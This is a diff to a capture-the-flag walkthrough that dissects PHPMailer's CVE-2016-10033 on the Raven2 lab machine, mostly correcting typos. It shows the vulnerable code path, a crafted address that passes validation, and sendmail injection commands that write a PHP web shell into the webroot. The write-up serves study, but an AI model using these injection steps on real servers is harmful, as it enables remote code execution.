@@ -4,11 +4,11 @@
 
 Within this walkthrough, I will skip any part not related to the web application exploitation, but for sake of consistency I would briefly explain what (and why) I skip.
 
-Raven2 web application is made on the top of wordpress, and a vulnerabity affecting the application can be found analysing a bunch of files only
+Raven2 web application is made on the top of WordPress, and a vulnerability affecting the application can be found analysing a bunch of files only
 
 #### Vulnerability Discovery
 
-Running a <code>find /var/www/html/ -type -f -regex .*php</code> give us the generic structure of the application. The first thing to note is that the the first level of the application contains merely html files, except one, contact.php. To give you the ability to review it, the admin put a zipped version of the file (a backup?) for you to download.
+Running a <code>find /var/www/html/ -type -f -regex .*php</code> give us the generic structure of the application. The first thing to note is that the first level of the application contains merely html files, except one, contact.php. To give you the ability to review it, the admin put a zipped version of the file (a backup?) for you to download.
 
 <pre><code>
 root@Raven:/var/www/html# ls -l
@@ -30,7 +30,7 @@ drwxrwxrwx 7 root     root      4096 Jan 19 20:06 vendor
 drwxrwxrwx 5 root     root      4096 Nov  9  2018 wordpress
 </code></pre>
 
-Within the file, we can note the following piece of code, that loads the PHPMailer plugin, creates a message from user input parameters withouth any form of validation and tries to send it:
+Within the file, we can note the following piece of code, that loads the PHPMailer plugin, creates a message from user input parameters without any form of validation and tries to send it:
 
 ```php
  <?php
@@ -59,7 +59,7 @@ if (isset($_REQUEST['action'])){
 ?>
 ```
 
-The version of the PHPMailer installed on raven is the 5.2.17 (observal from /var/www/html/vendor/changelog.md).
+The version of the PHPMailer installed on raven is the 5.2.17 (observable from /var/www/html/vendor/changelog.md).
 Moreover, accessing the file /var/www/html/vendor/SECURITY.md, it's possible to see that this version is affected by a known vulnerability.
 
 <pre><code>
@@ -83,7 +83,7 @@ Following, we will dissect the vulnerability known as [CVE-2016-10033](https://g
 
 #### Locate the vulnerable function
 
-We'll start analysing PHPMailerAutoload.php, which is only a loader, as its name suggests, which aim is loading class.* files within the module directory. We're mainly interested in the class.phpmailer.php file, which contains the send() function called in contact.php. The send function, below, calls two other functions, preSend and postSend.
+We'll start analysing `PHPMailerAutoload.php`, which is only a loader, as its name suggests, which aim is loading class.* files within the module directory. We're mainly interested in the `class.phpmailer.php` file, which contains the `send()` function called in `contact.php`. The send function, below, calls two other functions, `preSend` and `postSend`.
 
 ```php
 <?php
@@ -104,9 +104,9 @@ public function send()
     }
 }
 ```
-PreSend is the function that will prepare the message in a way that is ready to be sent. We will take this function into more consideration later, trying to find a way to bypass parameter filtering.
+`PreSend` is the function that will prepare the message in a way that is ready to be sent. We will take this function into more consideration later, trying to find a way to bypass parameter filtering.
 
-PostSend, instead, is the function that actually sends the message. It's crucial to understand the flow to the vulnerabilty. From its implementation we can see that different sub-routines are used to send the mail, basing on the value of the "Mailer" variable. At the start of the file, we can file that this variable is statically set to "mail". 
+`PostSend`, instead, is the function that actually sends the message. It's crucial to understand the flow to the vulnerability. From its implementation we can see that different sub-routines are used to send the mail, basing on the value of the "Mailer" variable. At the start of the file, we can file that this variable is statically set to "mail". 
 
 Note: To rapidly check for that, it's easy to add a logging routine just after the case 'mail', seeing that it's hit when a mail is sent from the contact us page.
 
@@ -142,8 +142,8 @@ public function postSend()
 }
 </code></pre>
 
-As seenable in `mailSend` function code, snippet below, the sender value is passed as it is in a sprintf function, withouth any validation. That makes it a very good candidate for a possible exploit.
-Then, the prgram flow is passed to `mailPassthru`.
+As observable in `mailSend` function code, snippet below, the sender value is passed as it is in a sprintf function, without any validation. That makes it a very good candidate for a possible exploit.
+Then, the program flow is passed to `mailPassthru`.
 
 <pre><code>
  protected function mailSend($header, $body)
@@ -186,7 +186,7 @@ Then, the prgram flow is passed to `mailPassthru`.
 Once reached `mailPassthru`, the code flow is passed to the standard PHP `mail` function, which is known to be susceptible to code injection attacks. As the affected parameter is `$param`, it seems to be claer that the function is vulnerable to an injection attack only if running in 'non safe' mode. Snippet below:
 
 <pre><code> 
-<strong>//Can't use additional_parameters in safe_mode</strong>
+<strong>//Can't use additional parameters in safe_mode</strong>
 //@link http://php.net/manual/en/function.mail.php
 if (ini_get('safe_mode') or !$this->UseSendmailOptions or is_null($params)) {
     $result = @mail($to, $subject, $body, $header);
@@ -202,7 +202,7 @@ tester@Raven:# php -r 'echo ini_get("safe_mode") ? "TRUE"."\n" : "FALSE"."\n";'
 FALSE
 ```
 
-So we know that we can reach that injection point. Before continuing further with the process of bypass the encoding I would like to insert here a nore about PHP `mail` exploitation. The following paragraph is copied directly (without any modification) from the fantastic work of <strong>opsxcq</strong>, who previously wrote a post on this vulnerability, found by <strong>Dawid Golunski</strong>, and develop a vulnerable dokcer container to play with it:
+So we know that we can reach that injection point. Before continuing further with the process of bypass the encoding I would like to insert here a note about PHP `mail` exploitation. The following paragraph is copied directly (without any modification) from the fantastic work of <strong>opsxcq</strong>, who previously wrote a post on this vulnerability, found by <strong>Dawid Golunski</strong>, and develop a vulnerable docker container to play with it:
 
 --- BEGIN NOTE
 
@@ -218,7 +218,7 @@ There are several exploitation methods for different results, we will focus on t
 
 A security note from [php official documentation](http://php.net/manual/en/function.mail.php):
 
-> The additional\_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmiail option.
+> The additional\_parameters parameter can be used to pass additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option.
 
 > This parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters. For security reasons, it is recommended for the user to sanitize this parameter to avoid adding unwanted parameters to the shell command.
 
@@ -235,18 +235,18 @@ There are also some other interesting parameters that you should know that exist
 And
 
     -O option=value
-    Set option option to the specified value. This form uses long names.
+    Set option to the specified value. This form uses long names.
 
 And for `-O` option, the `QueueDirectory` is the most interesting option there, this option select the directory in which to queue messages.
 
 If you want to read the whole list of parameters and options, just `man sendmail` or read it online [here](https://linux.die.net/man/8/sendmail.sendmail)
 
-Based on this information, and the hability to control at least one of the other parameters, we can exploit the host. Bellow the steps for a successful exploitation:
+Based on this information, and the ability to control at least one of the other parameters, we can exploit the host. Bellow the steps for a successful exploitation:
 
  * Control `$additional_parameters` and another `mail()` parameter
- * Know a **writeable** diretory on target host which is accessible via the target system and user (www-data for example). Usually this directory can be anything bellow `webroot` (aka /var/www/html for another systems, /www for this example)
+ * Know a **writeable** directory on target host which is accessible via the target system and user (www-data for example). Usually this directory can be anything bellow `webroot` (aka /var/www/html for another systems, /www for this example)
  * Any PHP payload that you want, we are using a simple `system()` payload in this example, with a spice of base64 and some special characters `|` to make it easier to parse. 
- * Just assembly everything together !
+ * Just assembly everything together!
 
 Remember that the `-X` option will write the log file, that will contain among the log information your PHP payload, in the directory that you will inform. An example of a vulnerable PHP code:
 
@@ -266,39 +266,46 @@ If you execute the code above, it will create a log file in the `/www/backdoor.p
 Ok, that's awesome, now we know we can exploit the injection point to reach remote code execution. But that is so simple? 
 Let's do one step back and take a look at what kind of validation is performed in `preSend` function:
 
-<pre><code>
-public function preSend()
-{
+```php
+1. <?php
+2. public function preSend()
+3. {
+4.
+5.        ...SNIPPED...
+6.
+7.        // Validate From, Sender, and ConfirmReadingTo addresses
+8.        foreach (array('From', 'Sender', 'ConfirmReadingTo') as $address_kind) {
+9.             $this->$address_kind = trim($this->$address_kind);
+10.            if (empty($this->$address_kind)) {
+11.                continue;
+12.            }
+13.            $this->$address_kind = $this->punyencodeAddress($this->$address_kind);
+14.            if (!$this->validateAddress($this->$address_kind)) {</strong>
+15.                $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
+16.                $this->setError($error_message);
+17.                $this->edebug($error_message);
+18.                if ($this->exceptions) {
+19.                    throw new phpmailerException($error_message);
+20.                }
+21.                return false;
+22.            }
+23.        }
+24.
+25.        ...SNIPPED...
+26.
+27.    }
+28. }    
+```
+The validation is performed in three steps:
 
-        ...SNIPPED...
-
-        // Validate From, Sender, and ConfirmReadingTo addresses
-        <strong>foreach (array('From', 'Sender', 'ConfirmReadingTo') as $address_kind) {</strong>
-            $this->$address_kind = trim($this->$address_kind);
-            if (empty($this->$address_kind)) {
-                continue;
-            }
-            <strong>$this->$address_kind = $this->punyencodeAddress($this->$address_kind);
-            if (!$this->validateAddress($this->$address_kind)) {</strong>
-                $error_message = $this->lang('invalid_address') . ' (punyEncode) ' . $this->$address_kind;
-                $this->setError($error_message);
-                $this->edebug($error_message);
-                if ($this->exceptions) {
-                    throw new phpmailerException($error_message);
-                }
-                return false;
-            }
-        }
-
-        ...SNIPPED...
-
-    }
-}    
-</code> </pre>
+* Null check (line 10.)
+* punyencodeAddress (line 13.)
+* validateAddress (line 14.)
 
 We can clearly observe that punyencodeaddress won't actually do anything more than checking if the mail address contains a "@" and if the domain is utf-8 encoded:
 
-```
+```php
+<?php
 public function punyencodeAddress($address)
 {
     // Verify we have required functions, CharSet, and at-sign.
@@ -346,6 +353,8 @@ Ok, so now we know that the flow of the program will choose `pcre8` as the valid
 Let's take a deeper look at the regex used:
 
 ```php
+<?php
+
 $regex= '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
         '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
         '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
@@ -374,7 +383,7 @@ $regex = '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[
 
 $address = (string)'"test chars:\" -A/=/a/b/c test" @test.com';
 
-print "[*] Testing the follwoing address:\n\t" . $address . "\n";
+print "[*] Testing the following address:\n\t" . $address . "\n";
 
 $res = preg_match($regex,$address);
 echo ((bool)$res ? "TRUE\n" : "FALSE\n");
@@ -392,7 +401,7 @@ TRUE
 
 #### Exploitation
 
-We just need to craft a a payload string that would allow us to write a log in a file reachable from the web server. Ideally, we will be able to inject php log into the file and use it as a vector to achieve code execution, as explained previously in the "Notes about PHP mail() function exploitation".
+We just need to craft a payload string that would allow us to write a log in a file reachable from the web server. Ideally, we will be able to inject php log into the file and use it as a vector to achieve code execution, as explained previously in the "Notes about PHP mail() function exploitation".
 
 Following the above example, we can modify the address from this:
 
@@ -413,19 +422,19 @@ tester@Raven:# php test.php
 TRUE
 ```
 
-When called by PHP mail function, the sendmail program would look like it was called from the commnad like in the following way:
+When called by PHP mail function, the sendmail program would look like it was called from the command like in the following way:
 ```
 tester@Raven:# sendmail -f"injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com
 
 ```
 
-However, if anyone tryes to execute the command this way, he will see that it won't work. To make it work properly, it's necessary to launch it this way:
+However, if anyone tries to execute the command this way, he will see that it won't work. To make it work properly, it's necessary to launch it this way:
 ```bash
 tester@Raven:# $(printf '/usr/sbin/sendmail -f"injection\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @pwnd.com') 
 
 ```
 Killing the command with `Ctrl+C`, and listing the files within the directory, 
-it's observable that the file shell.php has been created, registering the output of the command. At this point, the last thing to do is to choose where to put the PHP shell payload. We can control two additional part of the sendmail commnad, as seenable from the contact.php:
+it's observable that the file shell.php has been created, registering the output of the command. At this point, the last thing to do is to choose where to put the PHP shell payload. We can control two additional part of the sendmail command, as observable from the contact.php:
 
 ```php
 $name=$_REQUEST['name'];
@@ -435,7 +444,7 @@ $mail->Subject  = "Message from $name";
 $mail->Body     = $message;
 ```
 
-Any of the two can be choosen to inject the backdoor payload. To test it, it is possible to launch the sendmail directly from the command line and craft the mail manually:
+Any of the two can be chosen to inject the backdoor payload. To test it, it is possible to launch the sendmail directly from the command line and craft the mail manually:
 
 ```
 tester@Raven:# $(echo '/usr/sbin/sendmail -f"d3adc0de\" -OQueueDirectory=/tmp -X/var/www/html/shell.php server" @gmail.com')
